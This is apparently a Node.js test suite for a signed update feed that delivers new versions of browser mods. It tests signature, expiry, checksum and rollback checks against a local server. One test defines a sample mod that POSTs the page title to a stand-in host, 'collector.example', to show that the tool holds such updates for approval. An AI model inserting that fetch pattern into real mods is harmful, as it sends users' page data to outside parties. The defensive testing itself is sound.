'use strict';
// The mods feed (helper/lib/modsfeed.js): new versions of Tim's mods between releases, through the shipped-mod
// update path (preinstalled.js updateShippedMods), with the holds (held.js); and the release script's side
// of it (scripts/release.js mods-feed). Everything in temp folders, against a local server, with test keys.

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const http = require('http');
const crypto = require('crypto');
const { execFileSync } = require('child_process');
const { tempDir, privDir, runCli, FakeExtension, waitFor } = require('./fake-extension');
const F = require('../helper/lib/modsfeed');
const S = require('../helper/lib/preinstalled');
const { updateHeld } = require('../helper/lib/held');
const { scanMods } = require('../helper/lib/mods');
const { modsFeedBytes, modsFeedEntries, refreshModsFeed, signBytes, latestFeed } = require('../scripts/release');

const keys = () => {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
  return { pub: publicKey.export({ type: 'spki', format: 'pem' }), priv: privateKey.export({ type: 'pkcs8', format: 'pem' }) };
};
const K = keys();
const sha1 = (s) => crypto.createHash('sha1').update(s).digest('hex');
const sha256 = (s) => crypto.createHash('sha256').update(s).digest('hex');
const ID = 'x.com/detox-timeline';
const LIST = [{ id: ID, on: false }, { id: 'x.com/follow-status', on: false }];
const RETIRED = [{ id: 'x.com/plain-x', into: ID, since: '1', renamed: true }];
const COMMIT = 'a'.repeat(40);
const mod = (version, body = 'document.body.classList.add("calm");') =>
  `// ==WebMod==\n// @name Detox\n// @match https://x.com/*\n// @source webmods\n// @version ${version}\n// ==/WebMod==\n${body}\n`;

const cleanups = [];
test.after(async () => { for (const fn of cleanups.reverse()) { try { await fn(); } catch { /* ignore */ } } });

// A local "GitHub" serving a map of paths.
function serve(files) {
  const hits = [];
  const server = http.createServer((req, res) => {
    hits.push(req.url);
    const body = files[req.url];
    if (body === undefined) { res.writeHead(404); return res.end(); }
    res.writeHead(200);
    res.end(body);
  });
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => {
    const base = `http://127.0.0.1:${server.address().port}`;
    const s = { base, hits, files, close: () => new Promise((r) => server.close(r)) };
    cleanups.push(s.close);
    resolve(s);
  }));
}

// A workspace that has Tim's mods (version `v` of detox-timeline shipped with "this TRIF"), and its examples.
function world(v = '1', config = {}) {
  const root = tempDir();
  const home = path.join(root, 'ws');
  const examples = path.join(root, 'examples', 'sites');
  fs.mkdirSync(path.join(examples, 'x.com'), { recursive: true });
  fs.mkdirSync(home);
  fs.writeFileSync(path.join(root, 'examples', 'shipped-history.json'), '{}');
  fs.writeFileSync(path.join(examples, `${ID}.js`), mod(v));
  const ws = { home, modsDir: path.join(home, 'sites'), screenshots: path.join(home, 'screenshots'), config: { ...config } };
  S.preinstallMods(home, ws.modsDir, examples, LIST, [], { add: 'all' });
  S.updateShippedMods(home, ws.modsDir, examples, LIST, { feed: {} });
  const opts = { publicKey: K.pub, list: LIST, retired: RETIRED, examplesDir: examples, trif: '0.3.0' };
  return {
    root, home, examples, ws, opts,
    mine: (id = ID) => { try { return fs.readFileSync(path.join(ws.modsDir, `${id}.js`), 'utf8'); } catch { return null; } },
    edit: (code, id = ID) => fs.writeFileSync(path.join(ws.modsDir, `${id}.js`), code),
    rec: (id = ID) => S.loadPreinstalled(home).shipped[id],
    check: (o = {}) => F.check(ws, { force: true, ...opts, ...o }),
    apply: (o = {}) => F.apply(ws, { ...opts, ...o }),
  };
}

// A signed feed with these mods' files, served beside each other as on GitHub (updates/, examples/sites/).
async function publish(w, mods, { priv = K.priv, signed = new Date().toISOString(), minTrif = '0.3.0', tamper = null, sig = true, kind = null } = {}) {
  const files = {};
  const entries = {};
  for (const [id, code] of Object.entries(mods)) {
    files[`/examples/sites/${id}.js`] = tamper && tamper[id] ? tamper[id] : code;
    entries[id] = { version: /@version\s+(\S+)/.exec(code)[1], sha256: sha256(code), size: Buffer.byteLength(code), minTrif };
  }
  let feed = modsFeedBytes({ signed, release: '0.3.0', commit: COMMIT, mods: entries });
  if (kind) feed = Buffer.from(feed.toString('utf8').replace('"trif-mods"', JSON.stringify(kind)));
  files['/updates/mods.json'] = feed;
  if (sig) files['/updates/mods.json.sig'] = signBytes(feed, priv);
  const server = await serve(files);
  w.ws.config.modsFeed = `${server.base}/updates/mods.json`;
  return server;
}

test('the feed sits beside latest.json, and its files are fetched from the repo at its commit', () => {
  const pkg = { repository: { url: 'git+https://github.com/acapellascience/trif.git' } };
  const url = F.modsFeedUrl({ config: {} }, pkg);
  assert.equal(url, 'https://raw.githubusercontent.com/acapellascience/trif/main/updates/mods.json');
  assert.equal(F.fileUrl(url, COMMIT, ID), `https://raw.githubusercontent.com/acapellascience/trif/${COMMIT}/examples/sites/${ID}.js`);
  assert.equal(F.modsFeedUrl({ config: { updateFeed: 'http://127.0.0.1:9/updates/latest.json' } }, pkg), 'http://127.0.0.1:9/updates/mods.json');
  assert.equal(F.fileUrl('http://127.0.0.1:9/updates/mods.json', COMMIT, ID), `http://127.0.0.1:9/examples/sites/${ID}.js`);
  assert.equal(F.modsFeedUrl({ config: { modsFeed: 'https://mirror.example/m.json' } }, pkg), 'https://mirror.example/m.json');
  // versions of mods: dotted numbers
  assert.ok(F.newer('10', '9') && F.newer('2.1', '2') && F.newer('1', null) && !F.newer('2', '2') && !F.newer('x', '1'));
});

test('a feed not signed by the release key, or without a signature, is refused and changes nothing', async () => {
  const w = world('1', { autoUpdate: true });
  await publish(w, { [ID]: mod('2') }, { priv: keys().priv });
  let r = await w.check();
  assert.match(r.error, /not signed by the TRIF release key/);
  assert.deepEqual(r.available, []);
  assert.deepEqual(F.cached(w.home, w.opts), {});
  assert.deepEqual(w.apply(), { updated: [], waiting: [] });
  assert.equal(w.mine(), mod('1'));

  await publish(w, { [ID]: mod('2') }, { sig: false });
  r = await w.check();
  assert.match(r.error, /has no signature/);
  assert.equal(w.mine(), mod('1'));

  // (no key in this build at all)
  await publish(w, { [ID]: mod('2') });
  r = await w.check({ publicKey: null });
  assert.match(r.error, /no release key/);
});

test('a latest.json and its signature served as the mods feed is refused (each feed says which it is)', async () => {
  const w = world('1', { autoUpdate: true });
  const latest = latestFeed({ version: '0.3.1', published: '2026-11-14', signed: new Date().toISOString(), notes: '', url: 'https://x/t.tgz', sha256: 'a'.repeat(64), size: 1 });
  const server = await serve({ '/updates/mods.json': latest, '/updates/mods.json.sig': signBytes(latest, K.priv) });
  w.ws.config.modsFeed = `${server.base}/updates/mods.json`;
  assert.match((await w.check()).error, /isn't one \(no "kind": "trif-mods"\)/);
  await publish(w, { [ID]: mod('2') }, { kind: 'trif-release' });
  assert.match((await w.check()).error, /isn't one/);
});

test('an expired feed (signed more than 8 weeks ago) is refused', async () => {
  const w = world('1', { autoUpdate: true });
  const old = new Date(Date.now() - 9 * 7 * 24 * 3600 * 1000).toISOString();
  await publish(w, { [ID]: mod('2') }, { signed: old });
  const r = await w.check();
  assert.match(r.error, /more than 8 weeks ago/);
  assert.deepEqual(F.cached(w.home, w.opts), {});
  assert.equal(w.mine(), mod('1'));
  // 7 weeks is fine
  await publish(w, { [ID]: mod('2') }, { signed: new Date(Date.now() - 7 * 7 * 24 * 3600 * 1000).toISOString() });
  assert.equal((await w.check()).error, null);
});

test('a file that isn\'t the signed size and sha256 (or not the feed\'s @version) is refused', async () => {
  const w = world('1', { autoUpdate: true });
  // same size, other bytes
  await publish(w, { [ID]: mod('2') }, { tamper: { [ID]: mod('2').replace('calm', 'evil') } });
  let r = await w.check();
  assert.equal(r.error, null);
  assert.deepEqual(r.available, []);
  assert.match(r.skipped.find((s) => s.id === ID).why, /checksum doesn't match/);
  assert.equal(fs.existsSync(F.cachedFile(w.home, ID)), false);
  assert.deepEqual(w.apply(), { updated: [], waiting: [] });
  assert.equal(w.mine(), mod('1'));
  // longer
  await publish(w, { [ID]: mod('2') }, { tamper: { [ID]: mod('2') + '//more' } });
  r = await w.check();
  assert.match(r.skipped.find((s) => s.id === ID).why, /larger than|bytes, not the/);
  // a kept copy changed on disk afterwards isn't used either
  await publish(w, { [ID]: mod('2') });
  assert.deepEqual((await w.check()).available, [{ id: ID, version: '2' }]);
  fs.writeFileSync(F.cachedFile(w.home, ID), mod('2').replace('calm', 'evil'));
  assert.deepEqual(F.cached(w.home, w.opts), {});
  // the file's own @version must be the feed's
  const lying = mod('2');
  const server = await publish(w, { [ID]: lying });
  const feed = JSON.parse(server.files['/updates/mods.json']);
  feed.mods[ID].version = '3';
  server.files['/updates/mods.json'] = Buffer.from(JSON.stringify(feed));
  server.files['/updates/mods.json.sig'] = signBytes(server.files['/updates/mods.json'], K.priv);
  r = await w.check();
  assert.match(r.skipped.find((s) => s.id === ID).why, /@version is 2, not the feed's 3/);
});

test('entries for a newer TRIF (minTrif), not newer than this TRIF\'s, unknown or retired ids are skipped', async () => {
  const w = world('2', { autoUpdate: true });
  const other = 'x.com/not-shipped';
  await publish(w, { [ID]: mod('3'), [other]: mod('9'), 'x.com/plain-x': mod('9') }, { minTrif: '0.3.1' });
  let r = await w.check();
  assert.deepEqual(r.available, []);
  const why = Object.fromEntries(r.skipped.map((s) => [s.id, s.why]));
  assert.match(why[ID], /needs TRIF 0\.3\.1 \(this is 0\.3\.0\)/);
  assert.match(why[other], /not one of the mods this TRIF ships/);
  assert.match(why['x.com/plain-x'], /retired/);
  assert.ok(!r.skipped.some((s) => s.id === other && fs.existsSync(path.join(w.ws.modsDir, `${other}.js`))));
  // same version as this TRIF's: nothing
  await publish(w, { [ID]: mod('2') });
  r = await w.check();
  assert.match(r.skipped.find((s) => s.id === ID).why, /not newer than the version this TRIF has \(2\)/);
  // the TRIF it needs is here
  await publish(w, { [ID]: mod('3') }, { minTrif: '0.3.1' });
  r = await w.check({ trif: '0.3.1' });
  assert.deepEqual(r.available, [{ id: ID, version: '3' }]);
  // never a new mod: the unknown id isn't in the workspace, nor in what the feed keeps
  assert.equal(w.mine(other), null);
  assert.equal(fs.existsSync(F.cachedFile(w.home, other)), false);
  // and the copy kept for 0.3.1 isn't used by 0.3.0
  assert.deepEqual(Object.keys(F.cached(w.home, { ...w.opts, trif: '0.3.1' })), [ID]);
  assert.deepEqual(F.cached(w.home, w.opts), {});
});

test('automatic updates on: an unchanged copy gets the feed\'s version, stamped "updated" (starts off)', async () => {
  const w = world('1', { autoUpdate: true });
  await publish(w, { [ID]: mod('2', 'document.body.classList.add("calmer");') });
  assert.equal((await w.check()).error, null);
  const r = w.apply();
  assert.deepEqual(r.updated, [{ id: ID, version: '2', from: '1' }]);
  assert.equal(w.mine(), mod('2', 'document.body.classList.add("calmer");'));
  const rec = w.rec();
  assert.equal(rec.version, '2');
  assert.equal(rec.hash, sha1(mod('2', 'document.body.classList.add("calmer");')));
  assert.ok(typeof rec.auto === 'string', 'stamped: each browser switches it off once, "updated"');
  assert.deepEqual(Object.keys(S.autoUpdatedIds(w.home)), [ID]);
  assert.equal(fs.readFileSync(S.baseFile(w.home, ID), 'utf8'), mod('2', 'document.body.classList.add("calmer");'));
  // Tim's mod still: the feed's version counts as shipped
  const asMod = { id: ID, source: 'webmods', text: w.mine() };
  assert.deepEqual(S.changedShipped(w.examples, [asMod]), { [ID]: true }, 'without the workspace, not known');
  assert.deepEqual(S.changedShipped(w.examples, [asMod], w.home), {});
  // again: nothing more to do
  assert.deepEqual(w.apply(), { updated: [], waiting: [] });
  // a later setup (the examples still version 1) leaves it at version 2
  assert.deepEqual(S.updateShippedMods(w.home, w.ws.modsDir, w.examples, LIST), { updated: [], waiting: [] });
  assert.equal(w.rec().version, '2');
});

test('automatic updates off: the new version is offered, not applied', async () => {
  const w = world('1');
  await publish(w, { [ID]: mod('2') });
  await w.check();
  const r = w.apply();
  assert.deepEqual(r, { updated: [], waiting: [{ id: ID, version: '2' }] });
  assert.equal(w.mine(), mod('1'));
  const mods = scanMods(w.ws.modsDir).mods;
  assert.deepEqual(S.pendingUpdates(w.home, mods)[ID], { version: '2', from: '1', modified: false });
  // "Use the new version" takes it
  S.useNewVersion(w.ws, ID);
  assert.equal(w.mine(), mod('2'));
  assert.equal(w.rec().version, '2');
  assert.deepEqual(S.pendingUpdates(w.home, scanMods(w.ws.modsDir).mods), {});
  // turned on later, a new one is applied
  const w2 = world('1');
  await publish(w2, { [ID]: mod('2') });
  await w2.check();
  w2.apply();
  w2.ws.config.autoUpdate = true;
  assert.deepEqual(w2.apply().updated, [{ id: ID, version: '2', from: '1' }]);
});

test('a copy the user changed gets the offer and is never overwritten; Keep mine and merge work as for a release', async () => {
  const w = world('1', { autoUpdate: true });
  const theirs = mod('1', 'document.body.classList.add("mine");');
  w.edit(theirs);
  await publish(w, { [ID]: mod('2') });
  await w.check();
  assert.deepEqual(w.apply(), { updated: [], waiting: [{ id: ID, version: '2' }] });
  assert.equal(w.mine(), theirs);
  assert.deepEqual(S.pendingUpdates(w.home, scanMods(w.ws.modsDir).mods)[ID], { version: '2', from: '1', modified: true });
  assert.equal(fs.readFileSync(S.newFile(w.home, ID), 'utf8'), mod('2'));
  const m = S.mergeRequest(w.ws, ID);
  assert.equal(m.version, '2');
  assert.match(m.prompt, /\.shipped\/x\.com\/detox-timeline\.new\.js/);
  S.keepMine(w.ws, ID);
  assert.deepEqual(w.apply(), { updated: [], waiting: [] }, 'kept: not offered again');
  assert.equal(w.mine(), theirs);
});

test('a feed version that can do more than the released one waits for the user\'s OK (a release update doesn\'t)', async () => {
  const prev = process.env.TRIF_EXAMPLES_DIR;
  try {
    const sends = mod('2', 'fetch("https://collector.example/x", { method: "POST", body: document.title });');
    // From the feed:
    const w = world('1', { autoUpdate: true });
    process.env.TRIF_EXAMPLES_DIR = w.examples;
    updateHeld(w.ws, scanMods(w.ws.modsDir).mods, []); // (what's there is the user's: seen)
    await publish(w, { [ID]: sends });
    await w.check();
    assert.deepEqual(w.apply().updated.map((u) => u.id), [ID]);
    const held = updateHeld(w.ws, scanMods(w.ws.modsDir).mods, []);
    assert.ok(held[ID], 'held');
    assert.equal(held[ID].by, 'outside');
    assert.ok(held[ID].needs.length > 0);
    // the same version from a release (in examples/sites): judged against itself, as before
    const r = world('1', { autoUpdate: true });
    process.env.TRIF_EXAMPLES_DIR = r.examples;
    updateHeld(r.ws, scanMods(r.ws.modsDir).mods, []);
    fs.writeFileSync(path.join(r.examples, `${ID}.js`), sends);
    assert.deepEqual(S.updateShippedMods(r.home, r.ws.modsDir, r.examples, LIST).updated.map((u) => u.id), [ID]);
    assert.deepEqual(updateHeld(r.ws, scanMods(r.ws.modsDir).mods, []), {});
    // a feed version that does nothing more runs
    const q = world('1', { autoUpdate: true });
    process.env.TRIF_EXAMPLES_DIR = q.examples;
    updateHeld(q.ws, scanMods(q.ws.modsDir).mods, []);
    await publish(q, { [ID]: mod('2', 'document.body.classList.add("calmer");') });
    await q.check();
    q.apply();
    assert.deepEqual(updateHeld(q.ws, scanMods(q.ws.modsDir).mods, []), {});
  } finally {
    if (prev === undefined) delete process.env.TRIF_EXAMPLES_DIR; else process.env.TRIF_EXAMPLES_DIR = prev;
  }
});

test('an older feed served again never takes the user back to an older version', async () => {
  const w = world('1', { autoUpdate: true });
  await publish(w, { [ID]: mod('3') });
  await w.check();
  w.apply();
  assert.equal(w.mine(), mod('3'));
  await publish(w, { [ID]: mod('2') }); // (signed, inside the 8 weeks)
  await w.check();
  assert.deepEqual(w.apply(), { updated: [], waiting: [] });
  assert.equal(w.mine(), mod('3'));
  // nor with no feed copy at all (withdrawn: 404), the examples older
  const server = await serve({});
  w.ws.config.modsFeed = `${server.base}/updates/mods.json`;
  const r = await w.check();
  assert.equal(r.error, null);
  assert.equal(fs.existsSync(F.feedFile(w.home)), false);
  assert.deepEqual(S.updateShippedMods(w.home, w.ws.modsDir, w.examples, LIST), { updated: [], waiting: [] });
  assert.equal(w.mine(), mod('3'));
  // a release that ships version 3 itself: as before
  fs.writeFileSync(path.join(w.examples, `${ID}.js`), mod('3'));
  assert.deepEqual(S.updateShippedMods(w.home, w.ws.modsDir, w.examples, LIST), { updated: [], waiting: [] });
  assert.equal(w.rec().version, '3');
});

test('checks follow the update settings: not with checkForUpdates false, at most every 20 hours', async () => {
  const w = world('1', { autoUpdate: true });
  const server = await publish(w, { [ID]: mod('2') });
  w.ws.config.checkForUpdates = false;
  await F.check(w.ws, { ...w.opts });
  assert.deepEqual(server.hits, []);
  w.ws.config.checkForUpdates = true;
  const now = Date.now();
  await F.check(w.ws, { ...w.opts, now });
  const n = server.hits.length;
  assert.ok(n >= 3, 'feed, signature, file');
  await F.check(w.ws, { ...w.opts, now: now + 60 * 60 * 1000 });
  assert.equal(server.hits.length, n, 'cached');
  await F.check(w.ws, { ...w.opts, now: now + 21 * 60 * 60 * 1000 });
  assert.equal(server.hits.length, n + 2, 'again, the file already kept');
});

// ---------------------------------------------------------------- release.js

function gitRepo() {
  const dir = tempDir();
  const git = (...a) => execFileSync('git', a, { cwd: dir, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
  git('init', '-q');
  git('config', 'user.email', 't@example.com');
  git('config', 'user.name', 'T');
  const put = (id, code) => { fs.mkdirSync(path.dirname(path.join(dir, 'examples', 'sites', `${id}.js`)), { recursive: true }); fs.writeFileSync(path.join(dir, 'examples', 'sites', `${id}.js`), code); };
  return { dir, git, put, commit: (m) => { git('add', '-A'); git('commit', '-qm', m); return git('rev-parse', 'HEAD'); } };
}

test('release script: mods-feed lists the shipped mods changed since the last release, signed so the helper takes it', async () => {
  const r = gitRepo();
  const list = [{ id: ID }, { id: 'x.com/follow-status' }, { id: 'x.com/new-one' }, { id: 'x.com/plain-x' }];
  r.put(ID, mod('1'));
  r.put('x.com/follow-status', mod('4'));
  r.put('x.com/plain-x', mod('1'));
  r.commit('release');
  r.git('tag', 'v0.3.0');
  r.put(ID, mod('2', 'document.body.classList.add("fixed");'));
  r.put('x.com/new-one', mod('1'));
  r.put('x.com/plain-x', mod('2'));
  const head = r.commit('fix');
  const e = modsFeedEntries({ root: r.dir, commit: head, since: 'v0.3.0', minTrif: '0.3.0', list, retired: RETIRED });
  assert.deepEqual(e.problems, []);
  assert.deepEqual(Object.keys(e.mods), [ID]);
  const code = mod('2', 'document.body.classList.add("fixed");');
  assert.deepEqual(e.mods[ID], { version: '2', sha256: sha256(code), size: Buffer.byteLength(code), minTrif: '0.3.0' });
  assert.ok(e.notes.some((n) => /x\.com\/new-one: new since v0\.3\.0/.test(n)), 'a new mod needs a release');
  // a change without a newer @version stops it
  r.put('x.com/follow-status', mod('4', 'changed();'));
  const head2 = r.commit('oops');
  const e2 = modsFeedEntries({ root: r.dir, commit: head2, since: 'v0.3.0', minTrif: '0.3.0', list, retired: RETIRED });
  assert.match(e2.problems.join('\n'), /x\.com\/follow-status changed since v0\.3\.0, but its @version \(4\) isn't newer/);
  // --only
  const e3 = modsFeedEntries({ root: r.dir, commit: head, since: 'v0.3.0', minTrif: '0.3.0', only: ['x.com/follow-status'], list, retired: RETIRED });
  assert.deepEqual(e3.mods, {});
  assert.ok(e3.notes.some((n) => /left out \(--only\)/.test(n)));
  // what it writes, the helper verifies
  const bytes = modsFeedBytes({ signed: new Date().toISOString(), release: '0.3.0', commit: head, mods: e.mods });
  const feed = F.verifyModsFeed(bytes, signBytes(bytes, K.priv), K.pub);
  assert.deepEqual(feed.mods, e.mods);
  assert.equal(feed.commit, head);
  // and refresh-feed signs it again, the same mods, a new time
  const later = new Date(Date.now() + 5 * 7 * 24 * 3600 * 1000);
  const again = refreshModsFeed(bytes, signBytes(bytes, K.priv), { pub: K.pub, priv: K.priv, now: later });
  const f2 = F.verifyModsFeed(again.feed, again.sig, K.pub, { now: later.getTime() });
  assert.deepEqual(f2.mods, e.mods);
  assert.equal(f2.signedAt, later.getTime());
  assert.throws(() => refreshModsFeed(bytes, signBytes(bytes, keys().priv), { pub: K.pub, priv: K.priv }), /isn't a mods feed signed by the release key/);
});

// ---------------------------------------------------------------- the helper and the CLI

test('trif update checks the mods feed too, and says why one was refused', async () => {
  const home = tempDir();
  const feed = modsFeedBytes({ signed: new Date().toISOString(), release: '0.3.0', commit: COMMIT, mods: {} });
  const server = await serve({ '/updates/mods.json': feed, '/updates/mods.json.sig': signBytes(feed, keys().priv) });
  fs.writeFileSync(path.join(privDir(home), 'config.json'), JSON.stringify({ updateFeed: `${server.base}/updates/latest.json` }));
  let r = await runCli(['update'], { home });
  assert.equal(r.code, 0, r.stderr);
  assert.ok(server.hits.includes('/updates/mods.json'));
  assert.match(r.stdout, /Tim's mods: couldn't check the mods feed \(the mods feed is not signed by the TRIF release key/);
  r = await runCli(['update', '--json'], { home });
  assert.match(JSON.parse(r.stdout).mods.error, /not signed/);
});

test('host: the update check (the panel\'s Check now) checks the mods feed too', async () => {
  const home = tempDir();
  fs.mkdirSync(path.join(home, 'sites'), { recursive: true });
  const feed = modsFeedBytes({ signed: new Date().toISOString(), release: '0.3.0', commit: COMMIT, mods: {} });
  const server = await serve({ '/updates/mods.json': feed, '/updates/mods.json.sig': signBytes(feed, keys().priv) });
  fs.writeFileSync(path.join(privDir(home), 'config.json'), JSON.stringify({ updateFeed: `${server.base}/updates/latest.json` }));
  const ext = new FakeExtension({ home });
  cleanups.push(() => ext.close());
  await ext.nextMods();
  ext.hello();
  ext.send({ type: 'request', id: 'u1', cmd: 'update.check', args: { force: true } });
  await waitFor(() => server.hits.includes('/updates/mods.json.sig'), { message: 'the mods feed fetched' });
  await waitFor(() => /mods feed: the mods feed is not signed/.test(fs.readFileSync(path.join(privDir(home), 'helper.log'), 'utf8')), { message: 'logged' });
  assert.match(fs.readFileSync(path.join(home, '.mods-feed', 'state.json'), 'utf8'), /not signed/);
});
